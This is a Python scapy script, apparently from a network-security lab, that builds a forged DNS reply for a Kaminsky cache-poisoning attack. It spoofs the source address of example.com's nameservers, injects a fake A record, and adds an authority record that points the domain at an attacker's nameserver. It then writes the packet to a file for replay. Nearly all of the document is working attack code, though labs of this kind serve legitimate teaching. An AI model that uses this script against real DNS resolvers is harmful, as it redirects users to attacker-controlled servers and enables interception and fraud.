#!/usr/bin/env python3
from scapy.all import *


# Construct the DNS header and payload
name = 'twysw.example.com'
domain = 'example.com'
ns = 'ns.attacker32.com'

dstIP = '10.9.0.53'

## 1.2.3.4 is just a placeholder (dovrò cambiarlo con gli IP dei nameservers di example.com)
## a.iana-servers.net.		199.43.135.53
## b.iana-servers.net.		199.43.133.53
srcIP = '1.2.3.4' 

## Query Section
Qdsec = DNSQR(qname=name)
## Answer Section
Anssec = DNSRR(rrname=name, type='A', rdata='1.1.2.2', ttl=259200)
## Authority Section:
NSsec = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200) ## Goal of the Kaminsky Attack

dns = DNS(id=0xAAAA, aa=1, ra=0, rd=0, cd=0, qr=1, qdcount=1, ancount=1, nscount=1, arcount=0, qd=Qdsec, an=Anssec, ns=NSsec)


# Construct the IP, UDP headers, and the entire packet
ip = IP(dst=dstIP, src=srcIP, chksum=0)
udp = UDP(dport=33333, sport=53, chksum=0)
pkt = ip/udp/dns

pkt.show()

# Save the packet to a file
with open('ip_resp.bin', 'wb') as f:
	f.write(bytes(pkt))
